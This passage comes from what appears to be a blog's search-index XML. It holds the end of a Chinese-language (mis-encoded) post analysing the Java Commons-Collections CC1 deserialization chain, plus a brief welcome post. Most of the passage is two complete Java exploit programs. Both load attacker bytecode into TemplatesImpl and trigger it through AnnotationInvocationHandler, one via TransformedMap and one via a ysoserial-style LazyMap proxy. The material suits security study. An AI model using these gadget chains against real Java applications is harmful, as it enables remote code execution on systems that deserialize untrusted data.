é“¾çš„å‰åŠéƒ¨åˆ†æ‹¿è¿›å»ã€‚</li></ul><p>å®Œæ•´çš„ EXP å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//è¿™é‡Œæ˜¯é—®é¢˜äºŒä¸­æ”¹é”®å€¼å¯¹çš„å€¼ä¸ºæ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œé€šè¿‡ifåˆ¤æ–­</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//è¿™é‡Œæ˜¯é—®é¢˜äºŒä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ”¹æ³¨è§£ä¸ºTarget</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150406600.png" class="" title="This is an example image"><ul><li>ç„¶åæ˜¯ Yso æ­£ç‰ˆé“¾å­çš„ TemplatesImpl çš„å®ç°æ–¹å¼ã€‚</li></ul><p>EXP å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ysotemplate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates), <span class="comment">// æ„é€  setValue çš„å¯æ§å‚æ•°</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150715540.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°åšå®¢å•¦å•¦å•¦</title>
      <link href="/2024/12/26/hello-world/"/>
      <url>/2024/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>æ¬¢è¿æ¥åˆ°Meteor_Kaiçš„æš—é»‘ç³»åšå®¢ï¼Œä¸€ç›´è§‰å¾—å¾ˆå¸…ï¼Œä»Šå¤©ä¹Ÿæ˜¯æ¢ä¸Šäº†ï¼Œå˜»å˜»ã€‚</p><p>æ¬¢è¿å¤§å¸ˆå‚…ä»¬äº¤æµå“¦ï¼Œè”ç³»æ–¹å¼è§About Meã€‚</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
